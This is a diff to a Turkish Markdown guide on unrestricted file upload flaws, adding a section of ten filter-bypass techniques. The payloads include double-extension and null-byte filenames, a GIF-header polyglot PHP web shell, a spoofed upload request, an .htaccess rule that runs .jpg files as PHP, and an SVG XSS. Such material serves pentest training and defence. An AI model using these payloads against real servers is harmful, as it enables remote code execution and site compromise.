@@ -199,7 +199,7 @@ Kurban SVG dosyasını açtığında tarayıcıda XSS tetiklenir.
 Unrestricted File Upload açıkları sadece **sunucu tarafı RCE** için değil, aynı zamanda **istemci tarafı XSS**, **malware yayma**, **defacement**, **DoS** gibi birçok saldırı senaryosuna kapı aralar.  
 
 ---
-## 🛠️ Payload Örnekleri
+## 🛠️ Temel Saldırı Senaryoları
 
 Dosya yükleme açıklarının istismarında kullanılan payloadlar, saldırganın amacına göre değişiklik gösterir. Aşağıda en yaygın kullanılan örnekler listelenmiştir.  
 
@@ -347,5 +347,148 @@ Disk alanı dolar, servis kesintisi (DoS) oluşur.
 Payload seçimi hedef platforma (PHP, ASP, JSP) ve güvenlik kontrollerine (uzantı filtresi, MIME doğrulama, içerik analizi) bağlıdır.  
 
 ---
+
+## 🧨 WAF / Filtre Bypass Teknikleri
+
+Dosya yükleme zafiyetlerinde genellikle uzantı, içerik veya MIME type üzerinden filtreleme yapılır. Ancak bu filtreler zayıf ya da hatalı uygulanırsa saldırganlar çeşitli tekniklerle bypass edebilir.  
+
+Aşağıda yaygın kullanılan bypass yöntemleri ve örnek payloadlar listelenmiştir:  
+
+---
+
+### 1. Çift Uzantı Kullanımı
+**Payload:**
+shell.php.jpg  
+shell.jpg.php  
+
+**Kullanım:**
+- Eğer sistem sadece ilk veya son uzantıyı kontrol ediyorsa dosya kabul edilebilir.  
+
+**Sonuç:**
+Dosya yüklenir ve sunucu tarafında PHP olarak çalıştırılır.  
+
+---
+
+### 2. Büyük Harf / Küçük Harf Değiştirme
+**Payload:**
+shell.PhP  
+shell.PHP5  
+shell.PhtMl  
+
+**Kullanım:**
+- Sunucu uzantı kontrolünü case-sensitive yapıyorsa filtre atlatılır.  
+
+**Sonuç:**
+Zararlı dosya yüklenebilir hale gelir.  
+
+---
+
+### 3. Null Byte (%00) Enjeksiyonu
+**Payload (filename):**
+shell.php%00.jpg  
+
+**Kullanım:**
+- Bazı eski sistemler `%00` karakterinden sonrasını yok sayar.  
+
+**Sonuç:**
+Sunucu dosyayı `.php` olarak işler.  
+
+---
+
+### 4. İkili Uzantı (Polyglot)
+**Payload (shell.jpg.php içeriği):**
+GIF89a
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+- İçeriğin başına GIF header eklenir, böylece dosya resim gibi görünebilir.  
+
+**Sonuç:**
+Dosya hem resim hem script gibi davranır.  
+
+---
+
+### 5. MIME Type Manipülasyonu
+**HTTP Request:**
+POST /upload HTTP/1.1  
+Content-Type: image/jpeg  
+Content-Disposition: form-data; name="file"; filename="shell.php"  
+
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+- Saldırgan Content-Type headerını `image/jpeg` yapar.  
+
+**Sonuç:**
+Sunucu dosyayı güvenli sanarak kabul eder.  
+
+---
+
+### 6. Çift Content-Type Header
+**HTTP Request:**
+Content-Type: image/jpeg  
+Content-Type: application/x-php  
+
+**Kullanım:**
+- Sunucu tarafı hangi headerı dikkate aldığına göre PHP dosyası kabul edilir.  
+
+**Sonuç:**
+Zararlı dosya yüklenebilir.  
+
+---
+
+### 7. Bozuk Magic Bytes
+**Payload:**
+GIF89a<?php system($_GET['cmd']); ?>  
+
+**Kullanım:**
+- Dosya başına resim formatı magic bytes eklenir.  
+
+**Sonuç:**
+Antivirüs veya basit kontrol mekanizmaları atlatılabilir.  
+
+---
+
+### 8. White List Bypass (İzinli Formatı Kötüye Kullanma)
+**Örnek:**
+- `.svg` dosyaları izinli ise saldırgan şu dosyayı yükleyebilir:  
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>  
+
+**Sonuç:**
+SVG formatı zararsız gibi görünür ama aslında XSS tetikler.  
+
+---
+
+### 9. HTACCESS ile MIME Manipülasyonu (Apache Sunucularda)
+**Payload (.htaccess):**
+AddType application/x-httpd-php .jpg  
+
+**Kullanım:**
+- Önce `.htaccess` yüklenir.  
+- Sonra `evil.jpg` yüklenir, ama artık Apache bunu PHP gibi yorumlar.  
+
+**Sonuç:**
+Resim dosyası çalıştırılabilir script haline gelir.  
+
+---
+
+### 10. Çift Katmanlı Sıkıştırma
+**Payload:**
+evil.php.zip  
+evil.php.rar  
+
+**Kullanım:**
+- Eğer uygulama sıkıştırılmış dosyaları açıyorsa içinden PHP shell çıkabilir.  
+
+**Sonuç:**
+Filtre bypass edilerek zararlı dosya sisteme sokulur.  
+
+---
+
+📌 Özet:  
+Filtre bypass teknikleri genellikle **uzantı manipülasyonu**, **MIME spoofing**, **magic bytes ekleme** ve **çift uzantı** üzerine kuruludur. Bu yöntemlerle basit güvenlik kontrolleri kolayca atlatılabilir.  
+
+
 
 
